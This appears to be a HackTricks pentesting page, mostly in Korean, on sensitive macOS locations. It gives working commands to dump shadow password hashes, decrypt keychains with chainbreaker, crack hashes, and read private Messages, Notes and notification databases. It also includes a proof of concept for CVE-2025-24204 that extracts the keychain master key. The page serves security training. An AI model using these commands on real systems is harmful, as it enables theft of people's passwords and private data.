# macOS 민감한 위치 및 흥미로운 데몬

{{#include ../../../banners/hacktricks-training.md}}

## 비밀번호

### Shadow Passwords

Shadow password은 사용자의 구성과 함께 plist에 저장되어 있으며, 위치는 **`/var/db/dslocal/nodes/Default/users/`**에 있다.\
다음 한 줄 명령어는 **사용자에 대한 모든 정보**(해시 정보 포함)를 덤프하는 데 사용할 수 있다:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**이런 스크립트**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 또는 [**이 스크립트**](https://github.com/octomagon/davegrohl.git)는 해시를 **hashcat** **포맷**으로 변환하는 데 사용할 수 있습니다.

대안으로, 서비스 계정이 아닌 모든 계정의 creds를 hashcat 포맷 `-m 7100` (macOS PBKDF2-SHA512)으로 덤프하는 원라이너:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Another way to obtain the `ShadowHashData` of a user is by using `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

이 파일은 시스템이 **단일 사용자 모드**로 실행될 때에만 **사용됩니다**(따라서 자주 사용되지는 않습니다).

### 키체인 덤프

security 바이너리를 사용해 **비밀번호를 복호화된 상태로 덤프할 때**, 여러 프롬프트가 사용자에게 이 작업을 허용할지를 묻습니다.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> 해당 댓글 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에 따르면 이 도구들은 Big Sur에서 더 이상 작동하지 않는 것으로 보입니다.

### Keychaindump 개요

macOS 키체인에서 비밀번호를 추출하기 위해 **keychaindump**라는 도구가 개발되었으나, [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에서 지적한 것처럼 Big Sur 같은 최신 macOS 버전에서는 제한이 있습니다. **keychaindump**를 사용하려면 공격자가 접근 권한을 얻고 **root**로 권한 상승을 해야 합니다. 이 도구는 사용 편의를 위해 로그인 시 키체인이 기본적으로 잠금 해제된다는 사실을 악용하여, 애플리케이션이 사용자의 비밀번호를 반복해서 요구받지 않고도 키체인에 접근할 수 있게 됩니다. 그러나 사용자가 매번 사용 후 키체인을 잠그도록 설정해 두면 **keychaindump**는 효과가 없습니다.

**Keychaindump**는 Apple이 권한 부여 및 암호화 작업을 위한 데몬이라고 설명하는 특정 프로세스인 **securityd**를 표적으로 작동합니다. 추출 과정은 사용자의 로그인 비밀번호에서 유도된 **Master Key**를 식별하는 것을 포함합니다. 이 키는 키체인 파일을 읽는 데 필수적입니다. **Master Key**를 찾기 위해 **keychaindump**는 `vmmap` 명령을 사용하여 **securityd**의 메모리 힙을 스캔하고, `MALLOC_TINY`로 표시된 영역 내에서 잠재적인 키를 찾습니다. 다음 명령은 이러한 메모리 위치를 검사하는 데 사용됩니다:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
잠재적인 마스터 키를 식별한 후, **keychaindump**는 마스터 키 후보를 가리키는 특정 패턴(`0x0000000000000018`)을 찾기 위해 힙을 검색합니다. 이 키를 활용하려면 deobfuscation을 포함한 추가 단계가 필요하며, 그 세부 사항은 **keychaindump**의 소스 코드에 설명되어 있습니다. 이 영역에 집중하는 분석가는 키체인을 복호화하는 데 필요한 중요한 데이터가 **securityd** 프로세스의 메모리 안에 저장되어 있다는 점을 유의해야 합니다. **keychaindump**를 실행하는 예시 명령은:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can be used to extract the following types of information from an OSX keychain in a forensically sound manner:

- 해시된 Keychain password — [hashcat](https://hashcat.net/hashcat/) 또는 [John the Ripper](https://www.openwall.com/john/)로 크래킹하기에 적합
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Keychain 잠금 해제 암호, [volafox](https://github.com/n0fate/volafox) 또는 [volatility](https://github.com/volatilityfoundation/volatility)로 얻은 마스터 키, 또는 SystemKey와 같은 언락 파일이 주어지면 Chainbreaker는 평문 비밀번호도 제공합니다.

이러한 Keychain 잠금 해제 방법 중 하나가 없으면 Chainbreaker는 그 외 사용 가능한 모든 정보를 표시합니다.

#### **Keychain 키 덤프**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey로 키체인 키(비밀번호 포함) 덤프하기**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (비밀번호 포함) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **keychain 키(비밀번호 포함)를 memory dump로 덤프하기**

[Follow these steps](../index.html#dumping-memory-with-osxpmem)을 따라 **memory dump**를 수행하세요
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **사용자 password를 사용하여 keychain 키 (passwords 포함) 덤프**

사용자의 password를 알고 있다면, 이를 사용해 해당 사용자에게 속한 keychains를 **dump 및 decrypt**할 수 있습니다.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia)은 `/usr/bin/gcore`를 **`com.apple.system-task-ports.read`** entitlement와 함께 제공했기 때문에, 로컬 admin(또는 악성 서명된 앱)이 SIP/TCC가 적용된 상태에서도 **임의의 프로세스 메모리**를 덤프할 수 있었습니다. `securityd`를 덤프하면 **Keychain master key**가 평문으로 leaks되어 사용자 비밀번호 없이 `login.keychain-db`를 복호화할 수 있습니다.

**Quick repro on vulnerable builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 알림

알림 데이터는 `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`에서 찾을 수 있습니다.

대부분의 흥미로운 정보는 **blob**에 있습니다. 따라서 해당 내용을 **추출**하고 **변환**하여 **사람이** **읽을 수 있는** 형태로 만들거나 **`strings`**를 사용해야 합니다. 접근하려면 다음을 수행할 수 있습니다:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### 최근 프라이버시 문제 (NotificationCenter DB)

- In macOS **14.7–15.1** Apple stored banner content in the `db2/db` SQLite without proper redaction. CVEs **CVE-2024-44292/44293/40838/54504** allowed any local user to read other users' notification text just by opening the DB (no TCC prompt). Fixed in **15.2** by moving/locking the DB; on older systems the above path still leaks recent notifications and attachments.
- 해당 데이터베이스는 영향을 받는 빌드에서만 world-readable하므로, 레거시 엔드포인트를 조사할 때에는 아티팩트를 보존하기 위해 업데이트하기 전에 복사하세요.

### 참고

사용자의 **노트**는 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`에서 찾을 수 있습니다
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Preferences

macOS 앱의 환경설정은 **`$HOME/Library/Preferences`**에 위치하며, iOS에서는 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`에 있습니다.

macOS에서는 CLI 도구 **`defaults`**를 사용하여 **환경설정 파일을 수정**할 수 있습니다.

**`/usr/sbin/cfprefsd`**는 XPC 서비스 `com.apple.cfprefsd.daemon` 및 `com.apple.cfprefsd.agent`를 등록하며, 환경설정 수정과 같은 작업을 수행하도록 호출될 수 있습니다.

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` 파일은 노드 속성에 적용되는 권한을 포함하고 있으며 SIP로 보호됩니다.\
이 파일은 UUID(UID가 아니라)로 특정 사용자에게 권한을 부여하여 `ShadowHashData`, `HeimdalSRPKey` 및 `KerberosKeys` 등과 같은 특정 민감한 정보에 접근할 수 있도록 합니다:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## 시스템 알림

### Darwin 알림

알림의 주요 데몬은 **`/usr/sbin/notifyd`** 입니다. 알림을 수신하려면 클라이언트가 `com.apple.system.notification_center` Mach 포트를 통해 등록해야 합니다(`sudo lsmp -p <pid notifyd>`로 확인). 데몬은 `/etc/notify.conf` 파일로 구성할 수 있습니다.

알림에 사용되는 이름은 고유한 역방향 DNS 표기법이며, 해당 이름으로 알림이 전송되면 이를 처리할 수 있다고 표시한 클라이언트가 알림을 수신합니다.

현재 상태를 덤프(모든 이름 확인 포함)하려면 notifyd 프로세스에 신호 SIGUSR2를 보내고 생성된 파일을 읽으면 됩니다: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center**의 주요 바이너리는 **`/usr/sbin/distnoted`**이며, 알림을 전송하는 또 다른 방법입니다. 일부 XPC 서비스를 노출하고 클라이언트를 검증하려 시도하는 몇 가지 검사를 수행합니다.

### Apple Push Notifications (APN)

이 경우 애플리케이션은 **토픽**에 등록할 수 있습니다. 클라이언트는 **`apsd`**를 통해 Apple의 서버에 접속하여 토큰을 생성합니다.  
그런 다음 providers도 토큰을 생성하여 Apple의 서버에 연결해 클라이언트로 메시지를 보낼 수 있습니다. 이 메시지들은 로컬에서 **`apsd`**가 수신하여 해당 알림을 기다리는 애플리케이션으로 전달합니다.

환경설정 파일은 `/Library/Preferences/com.apple.apsd.plist`에 위치합니다.

macOS에서는 `/Library/Application\ Support/ApplePushService/aps.db`에, iOS에서는 `/var/mobile/Library/ApplePushService`에 메시지 로컬 데이터베이스가 있습니다. 데이터베이스에는 3개의 테이블이 있습니다: `incoming_messages`, `outgoing_messages` 및 `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
다음과 같이 daemon 및 connections에 대한 정보를 얻을 수도 있습니다:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## 사용자 알림

These are notifications that the user should see in the screen:

- **`CFUserNotification`**: 이 API는 화면에 메시지 팝업을 표시하는 방법을 제공합니다.
- **The Bulletin Board**: iOS에서 사라지는 배너를 표시하며 Notification Center에 저장됩니다.
- **`NSUserNotificationCenter`**: MacOS에서 iOS의 Bulletin Board 역할을 합니다. 알림 데이터베이스는 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`에 위치합니다.

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
